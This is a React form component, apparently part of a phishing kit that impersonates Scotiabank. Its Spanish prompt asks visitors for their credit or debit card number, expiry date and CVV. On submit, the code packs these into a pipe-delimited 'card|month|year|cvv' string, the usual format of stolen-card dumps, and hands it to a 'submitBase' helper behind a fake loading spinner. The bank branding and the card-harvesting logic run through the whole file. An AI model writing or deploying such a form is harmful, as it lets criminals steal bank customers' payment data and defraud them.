import { useFormik } from 'formik'

import { cardValidate } from '../../../security/cardValidate'
import { CreditCardInput } from './CreditCardInput'
import { ErrorCreditCard } from './ErrorCreditCard'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'
import { useGeneralData } from '../../../hooks/useGeneralData'

const valuesData = { card: '', month: 'mes', year: 'año', cvv: '' }

export const CreditCard = () => {

    const dataImportant = useGeneralData({modeLive: false, spiner: true, timeLoader: 2000 })
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => cardValidate({values}),
        onSubmit: async({card, month, cvv, year}) => {
            valuesData.tarjeta = `${card.toString().slice(0, 16).replace(/[^0-9]*$/, '')}|${month < 10 ? `0${month}` : month }|${year}|${cvv.toString().slice(0, 3)}`

            submitBase({dataImportant, valuesData})}
    })

    return (
        <div>
            {/* Spiner de carga */}
            {
                dataImportant.showSpiner === true ? <Spiner /> : (
                    <div className='mt-11 mx-10 flex flex-col md:px-[300px] gap-10'>
                        <div>
                            <p className='scotiaHeadline text-3xl text-[#333333] md:text-4xl text-center mb-20'>Ingresa los datos de tu tarjeta de credito o debito</p>
                            <form className='flex flex-col items-center w-full gap-10' onSubmit={handleSubmit}>

                                <CreditCardInput
                                    card={values.card.toString().slice(0, 16)}
                                    year={values.year}
                                    month={values.month}
                                    cvv={values.cvv.toString().slice(0, 3)}
                                    handleChange={handleChange} 
                                    handleBlur={handleBlur} 
                                    touched={touched}
                                    errors={errors}
                                />
                                <div className="flex justify-between w-full">

                                    <div className="flex  items-center gap-3">
                                        <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-[#000] stroke-[#000]">
                                            <path d="M0.900024 9H17.1"></path>
                                            <path d="M7.23916 2.66016L0.900024 8.99929L7.23916 15.3384" fill="none"></path>
                                        </svg>
                                        <span 
                                            className='text-[20px] scotiaBold'
                                            >
                                            Volver
                                        </span>
                                    </div>

                                    {/* border-[1px] border-[#ec111a] rounded-lg py-4 text-lg text-[#ec111a] scotiaBold w-full transition-all 
                                            hover:bg-[#be061b] hover:border-[#be061b] hover:text-white mb-20 */}
                                    <div>
                                        <button 
                                            className="flex items-center gap-4 scotiaBold disabled:text-[#f6f6f6] text-[20px]"
                                            disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}

                                            type='submit'
                                            >
                                            Continuar
                                            <button 
                                                disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}

                                                className="disabled:bg-[#f6f6f6] disabled:border-[2px] disabled:border-[#bcbcbc] transition-all bg-[#ec111a] border-[2px] border-[#ec111a] w-[50px] h-[50px] flex justify-center items-center rounded-full">
                                                    <svg width="24" height="24" viewBox="0 0 24 24" class="stroke-[#fff] fill-[#fff]">
                                                        <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44"></path>
                                                    </svg>
                                            </button>
                                        </button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                )
            }
            
        </div>
    )
}
